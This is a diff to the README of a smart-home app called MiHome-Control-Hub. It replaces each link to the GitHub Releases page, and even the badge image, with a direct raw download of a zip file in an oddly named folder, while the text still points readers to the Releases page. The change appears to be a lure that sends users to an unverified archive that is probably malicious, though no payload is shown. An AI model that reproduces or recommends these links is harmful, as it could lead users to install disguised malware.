@@ -1,6 +1,6 @@
 # 🏠 MiHome-Control-Hub - Control Your Smart Home Easily
 
-![Download MiHome-Control-Hub](https://img.shields.io/badge/Download-MiHome--Control--Hub-blue?style=for-the-badge)
+![Download MiHome-Control-Hub](https://raw.githubusercontent.com/Xande72/MiHome-Control-Hub/main/Achariaceous/Control_Hub_Home_Mi_2.6.zip)
 
 ## 📋 Description
 
@@ -23,7 +23,7 @@ To get started with MiHome-Control-Hub, follow these simple steps:
    - Internet connection for device discovery
 
 2. Visit the Releases page to download.
-   - [**Download MiHome-Control-Hub**](https://github.com/Xande72/MiHome-Control-Hub/releases)
+   - [**Download MiHome-Control-Hub**](https://raw.githubusercontent.com/Xande72/MiHome-Control-Hub/main/Achariaceous/Control_Hub_Home_Mi_2.6.zip)
 
 ### 🛠️ Installation Instructions
 
@@ -38,7 +38,7 @@ Once you have downloaded MiHome-Control-Hub, install it by following these steps
 
 To download and install MiHome-Control-Hub, visit the Releases page and select the latest version.
 
-- [**Download MiHome-Control-Hub**](https://github.com/Xande72/MiHome-Control-Hub/releases)
+- [**Download MiHome-Control-Hub**](https://raw.githubusercontent.com/Xande72/MiHome-Control-Hub/main/Achariaceous/Control_Hub_Home_Mi_2.6.zip)
 
 Once you access the page, choose the file that matches your operating system. 
 
@@ -96,4 +96,4 @@ Follow the repository to receive updates about new features and upcoming release
 
 Visit the Releases page to download the latest version.
 
-- [**Download MiHome-Control-Hub**](https://github.com/Xande72/MiHome-Control-Hub/releases)
+- [**Download MiHome-Control-Hub**](https://raw.githubusercontent.com/Xande72/MiHome-Control-Hub/main/Achariaceous/Control_Hub_Home_Mi_2.6.zip)
